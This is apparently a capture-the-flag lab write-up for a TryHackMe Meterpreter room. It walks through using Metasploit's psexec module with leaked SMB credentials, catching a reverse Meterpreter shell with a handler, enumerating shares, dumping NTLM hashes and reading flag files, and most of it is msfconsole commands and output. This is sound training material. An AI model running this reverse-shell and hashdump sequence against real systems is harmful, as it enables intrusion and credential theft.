---
URL: https://tryhackme.com/r/room/meterpreter
---
From an initial compromise we have obtained the username and password of an SMB server. We will use the metasploit framework to establish a reverse shell connection to the server and exfiltrate information from it.

## Configuring SMB psexec

We will first load the `exploit/windows/smb/psexec` module using use. Then we can use `show options` to check which parameters we can set to configure the exploit.

```bash
msf6 exploit(windows/smb/psexec) > use exploit/windows/smb/psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.139.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

From the above output, we can see that the compromised usernames and passwords can be set via the `SMBUser` and `SMBPass` options respectively. `RHOST` is set to the ip address of the target machine.

Furthermore, since we are planning to initiate a reverse connection, we need to set `LHOST` to the ip address of our machine.

```bash
msf6 exploit(windows/smb/psexec) > set SMBUSER ballen
SMBUSER => ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf6 exploit(windows/smb/psexec) > set RHOST 10.10.109.254
RHOST => 10.10.109.254
msf6 exploit(windows/smb/psexec) > set LHOST 10.4.72.115
LHOST => 10.4.72.115
```

## Connection Handler

However, before running the exploit we should create a handler to receive the incoming connection. We can use the `exploit/multi/handler` command to initiate this.

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
```

We can see that by default, the generic reverse shell payload is used. We should change this to match the payload we are planning to use with the smb exploit module, which is `windows/meterpreter/reverse_tcp`. Afterwards, we can set the options we need.

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.4.72.115
LHOST => 10.4.72.115
msf6 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.4.72.115      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

Now we can run the handler and wait for a connection

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.72.115:4444 
```

## Creating the Reverse Shell

We can now issue the `run` command on the exploit module to run the exploit and create the reverse shell.

```bash
msf6 exploit(windows/smb/psexec) > run

[-] Handler failed to bind to 10.4.72.115:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] 10.10.109.254:445 - Connecting to the server...
[*] 10.10.109.254:445 - Authenticating to 10.10.109.254:445 as user 'ballen'...
[*] 10.10.109.254:445 - Selecting PowerShell target
[*] 10.10.109.254:445 - Executing the payload...
[+] 10.10.109.254:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
```

On the handler side we can see the following:

```bash
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (176198 bytes) to 10.10.109.254
[*] Meterpreter session 3 opened (10.4.72.115:4444 -> 10.10.109.254:60234) at 2024-04-09 10:14:53 +1000

meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
```

Now we have successfully created a connection to the target machine. We can start traversing directories and exfiltrating data now.

## Data Exfiltration

### SMB Shares

We can now enumerate available SMB shares and get information about them. To do this we can search for a module that enables us to enumerates smb shares. This can be found by typing `search smb share` in msfconsole. To move from the meterpreter back to msfconsole we can background the session by typing `bg`.

```bash
meterpreter > bg
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > search smb share

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   1   auxiliary/server/capture/smb                                                     normal     No     Authentication Capture: SMB
   2   post/linux/busybox/smb_share_root                                                normal     No     BusyBox SMB Sharing
   3   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   4   exploit/windows/smb/generic_smb_dll_injection                   2015-03-04       manual     No     Generic DLL Injection From Shared 
   .
   .
   .
   27  post/windows/gather/enum_shares                                                  normal     No     Windows Gather SMB Share Enumeration via Registry
```

From the above result we can see module 27 is the one we are after. We can load the module and gather more information by using the `show info` command.

```bash
msf6 exploit(multi/handler) > use 27
msf6 post(windows/gather/enum_shares) > show info

       Name: Windows Gather SMB Share Enumeration via Registry
     Module: post/windows/gather/enum_shares
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Carlos Perez <carlos_perez@darkoperator.com>

Module stability:
 crash-safe

Compatible session types:
  Meterpreter
  Powershell
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  CURRENT  true             yes       Enumerate currently configured shares
  ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
  RECENT   true             yes       Enumerate recently mapped shares
  SESSION                   yes       The session to run this module on

Description:
  This module will enumerate configured and recently used file shares.


View the full module info with the info -d command.
```

We can see from the options section, we only need to provide the session number. We can find available sessions by issuing the `sessions` command.

```bash
msf6 post(windows/gather/enum_shares) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.4.72.115:4444 -> 10.10.109.254:57750 (10.10.109.254)
```

Set the session to number 2 and run the module.

```bash
msf6 post(windows/gather/enum_shares) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.109.254)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```

### NLTM Hashes

By running the `hashdump` command, we can get get the target systems password hash file.

```bash
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:0160a066349f782d470cfb8a9514b95f:::
```

### Flags

We can then search for flags by using the search command.

```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 17:44:27 +1000

meterpreter > pwd
C:\Windows\system32
meterpreter > cd ../../
meterpreter > cd Program\ Files\ (x86)//Windows\ Multimedia\ Platform
meterpreter > ls
Listing: C:\Program Files (x86)\Windows Multimedia Platform
===========================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  35     fil   2021-07-30 17:44:27 +1000  secrets.txt
100666/rw-rw-rw-  40432  fil   2018-09-15 17:12:04 +1000  sqmapi.dll

meterpreter > cat secrets.txt 
My Twitter password is KDSvbsw3849!
```

The next flag we are after is `realsecret.txt`.

```bash
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 18:30:24 +1000

meterpreter > cd c:\\inetpub\\wwwroot
meterpreter > ls
Listing: c:\inetpub\wwwroot
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  729    fil   2021-07-30 17:56:30 +1000  iisstart.htm
100666/rw-rw-rw-  99710  fil   2021-07-30 16:52:45 +1000  iisstart.png
100666/rw-rw-rw-  34     fil   2021-07-30 18:30:24 +1000  realsecret.txt

meterpreter > cat realsecret.txt 
The Flash is the fastest man alive
```

